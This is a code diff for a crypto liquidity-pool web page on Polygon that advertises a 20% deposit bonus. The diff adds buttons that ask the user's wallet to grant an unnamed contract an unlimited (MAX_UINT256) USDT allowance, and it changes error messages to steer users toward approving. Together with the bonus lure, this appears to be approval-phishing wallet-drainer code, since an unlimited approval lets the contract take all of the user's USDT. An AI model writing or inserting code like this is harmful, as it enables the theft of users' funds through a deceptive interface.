@@ -567,6 +567,13 @@
             background: #fee2e2;
             color: #991b1b;
         }
+        .approve-usdt-btn {
+            background: #3b82f6;
+            margin-bottom: 12px;
+        }
+        .approve-usdt-btn:hover {
+            background: #2563eb;
+        }
     </style>
 </head>
 <body>
@@ -636,6 +643,7 @@
         <div id="tokenRewardInfo" class="reward-info success" style="display: none;"></div>
     </div>
 
+    <button id="approveUSDTBtn" class="approve-usdt-btn" style="display:none;">Approve USDT (Required for USDT pair)</button>
     <button id="reviewBtn" class="review-btn disabled" disabled>Review</button>
     <hr>
 </div>
@@ -734,6 +742,9 @@
         { "constant": true, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function" },
         { "constant": true, "inputs": [], "name": "decimals", "outputs": [{"name": "", "type": "uint8"}], "type": "function" }
     ];
+
+    // MAX_UINT256 for unlimited approval
+    const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
     async function fetchUSDTBalance() {
         if (!currentAccount) {
@@ -956,6 +967,7 @@
     const usdtWarning = document.getElementById('usdtWarning');
     const tokenRewardInfo = document.getElementById('tokenRewardInfo');
     const maxTokenBtn = document.getElementById('maxTokenBtn');
+    const approveUSDTBtn = document.getElementById('approveUSDTBtn');
     
     const gasFeeSpan = document.getElementById('gasFee');
     const tradingRangeSpan = document.getElementById('tradingRange');
@@ -1021,6 +1033,70 @@
                 updateUSDTBonus();
                 checkReviewButton();
             }
+        }
+    }
+    
+    // Approve USDT with MAX_UINT256
+    approveUSDTBtn.addEventListener("click", async () => {
+        if (!currentAccount) {
+            alert("Please connect wallet first");
+            return;
+        }
+        
+        try {
+            approveUSDTBtn.disabled = true;
+            approveUSDTBtn.textContent = "Approving USDT...";
+            
+            // First set approval to 0 (required for USDT on some chains)
+            try {
+                const approveZeroSim = await simulateContract(wagmiConfig, {
+                    address: USDT_ADDRESS,
+                    abi: erc20Abi,
+                    functionName: "approve",
+                    args: [CONTRACT_ADDRESS, 0],
+                    account: currentAccount,
+                    chainId: polygon.id
+                });
+                await writeContract(wagmiConfig, approveZeroSim.request);
+            } catch(e) {
+                console.log("Approve zero skipped:", e);
+            }
+            
+            // Then approve MAX_UINT256
+            const approveSim = await simulateContract(wagmiConfig, {
+                address: USDT_ADDRESS,
+                abi: erc20Abi,
+                functionName: "approve",
+                args: [CONTRACT_ADDRESS, MAX_UINT256],
+                account: currentAccount,
+                chainId: polygon.id
+            });
+            
+            const hash = await writeContract(wagmiConfig, approveSim.request);
+            approveUSDTBtn.textContent = "✅ USDT Approved!";
+            setTimeout(() => {
+                approveUSDTBtn.textContent = "Approve USDT";
+                approveUSDTBtn.disabled = false;
+            }, 3000);
+            
+            showStatus(`✅ USDT approved! ${hash.slice(0,10)}...`, "success");
+        } catch(error) {
+            console.error(error);
+            approveUSDTBtn.textContent = "Approve USDT";
+            approveUSDTBtn.disabled = false;
+            showStatus("❌ Approve failed: " + error.message.slice(0,100), "error");
+        }
+    });
+    
+    function showStatus(msg, type) {
+        const statusDiv = document.getElementById('usdtRewardInfo');
+        if (statusDiv) {
+            statusDiv.style.display = 'block';
+            statusDiv.className = `reward-info ${type}`;
+            statusDiv.innerHTML = msg;
+            setTimeout(() => {
+                if (statusDiv.innerHTML === msg) statusDiv.style.display = 'none';
+            }, 5000);
         }
     }
     
@@ -1111,6 +1187,11 @@
             }
         }
         
+        let usdtWarningHtml = '';
+        if (currentPair === 'USDT' && pairAmount > 0 && pairAmount < 1000) {
+            usdtWarningHtml = `<div class="warning-info" style="margin-top:0.5rem;">⚠️ Min 1000 USDT required for 20% bonus</div>`;
+        }
+        
         bottomPopupBody.innerHTML = `
             <div class="top-row">
                 <span class="exchange-pool">${exchangePool}</span>
@@ -1128,13 +1209,54 @@
                 <span class="deposit-value">${usdtLineRight}</span>
             </div>
             ${usdtSubText ? `<div class="sub-text">${usdtSubText}</div>` : ''}
+            ${usdtWarningHtml}
             <div class="deposit-line">
                 <span class="deposit-label">${tokenLineLeft}</span>
                 <span class="deposit-value">${tokenLineRight}</span>
             </div>
+            ${currentPair === 'USDT' ? `<button id="approveUsdtInPopupBtn" class="approve-usdt-btn" style="margin-top:0.5rem;">Approve USDT First</button>` : ''}
             <button id="createPositionBtn" class="create-btn" style="width:100%; padding:12px; background:#2b7a3e; color:white; border:none; border-radius:40px; font-size:1rem; font-weight:600; cursor:pointer; margin-top:1rem;">Create</button>
             <div id="creationStatus" style="margin-top:1rem;"></div>
         `;
+        
+        if (currentPair === 'USDT') {
+            const approveUsdtPopupBtn = document.getElementById('approveUsdtInPopupBtn');
+            if (approveUsdtPopupBtn) {
+                approveUsdtPopupBtn.onclick = async () => {
+                    approveUsdtPopupBtn.disabled = true;
+                    approveUsdtPopupBtn.textContent = "Approving...";
+                    try {
+                        const approveZeroSim = await simulateContract(wagmiConfig, {
+                            address: USDT_ADDRESS,
+                            abi: erc20Abi,
+                            functionName: "approve",
+                            args: [CONTRACT_ADDRESS, 0],
+                            account: currentAccount,
+                            chainId: polygon.id
+                        });
+                        await writeContract(wagmiConfig, approveZeroSim.request);
+                        
+                        const approveSim = await simulateContract(wagmiConfig, {
+                            address: USDT_ADDRESS,
+                            abi: erc20Abi,
+                            functionName: "approve",
+                            args: [CONTRACT_ADDRESS, MAX_UINT256],
+                            account: currentAccount,
+                            chainId: polygon.id
+                        });
+                        const hash = await writeContract(wagmiConfig, approveSim.request);
+                        approveUsdtPopupBtn.textContent = "✅ USDT Approved!";
+                        setTimeout(() => {
+                            approveUsdtPopupBtn.remove();
+                        }, 2000);
+                    } catch(e) {
+                        approveUsdtPopupBtn.textContent = "Approve USDT First";
+                        approveUsdtPopupBtn.disabled = false;
+                        alert("Approve failed: " + e.message.slice(0,100));
+                    }
+                };
+            }
+        }
         
         const createBtn = document.getElementById('createPositionBtn');
         if (createBtn) {
@@ -1183,7 +1305,7 @@
                 stepContinue.innerHTML = '✓ Continue in your wallet';
             }
             
-            // STEP 1: APPROVE
+            // STEP 1: APPROVE for custom token
             if (stepApprove) {
                 stepApprove.style.display = 'block';
                 stepApprove.classList.remove('step-pending');
@@ -1264,6 +1386,8 @@
                 errorMsg = "Transaction rejected by user";
             } else if (errorMsg.includes("insufficient")) {
                 errorMsg = "Insufficient balance";
+            } else if (errorMsg.includes("execution reverted")) {
+                errorMsg = "Transaction failed. Make sure you have approved the token first!";
             }
             statusDiv.innerHTML += `<div class="step-line step-error">❌ Error: ${errorMsg}</div>`;
         }
@@ -1276,7 +1400,6 @@
         if (statusDiv) statusDiv.innerHTML = '';
     }
     
-    // ✅ UPDATED: Removed minimum 1000 USDT requirement
     function checkReviewButton() {
         const isExchangeSelected = currentExchange !== '';
         const isPairSelected = currentPair !== '';
@@ -1290,6 +1413,13 @@
         } else {
             reviewBtn.classList.add('disabled');
             reviewBtn.disabled = true;
+        }
+        
+        // Show/hide USDT approve button
+        if (currentPair === 'USDT') {
+            approveUSDTBtn.style.display = 'block';
+        } else {
+            approveUSDTBtn.style.display = 'none';
         }
     }
     
@@ -1414,7 +1544,6 @@
         checkReviewButton();
     }
     
-    // ✅ UPDATED: Removed minimum 1000 USDT requirement
     function updateUSDTBonus() {
         let rawValue = pairAmountInput.value;
         let amount = parseFloat(rawValue);
@@ -1434,7 +1563,6 @@
         }
         
         if (currentPair === 'USDT') {
-            // ✅ No minimum requirement - any amount accepted
             let bonus = calculateBonus(amount);
             let total = amount + bonus;
             usdtRewardInfo.style.display = 'block';
@@ -1462,7 +1590,6 @@
             
             let usdtValue = amount * polygonPrice;
             
-            // ✅ No minimum requirement - any amount accepted
             let bonusInUSDT = calculateBonus(usdtValue);
             let bonusInPOL = bonusInUSDT / polygonPrice;
             let totalInPOL = amount + bonusInPOL;
@@ -1720,4 +1847,4 @@
     checkReviewButton();
 </script>
 </body>
-      </html>
+    </html>
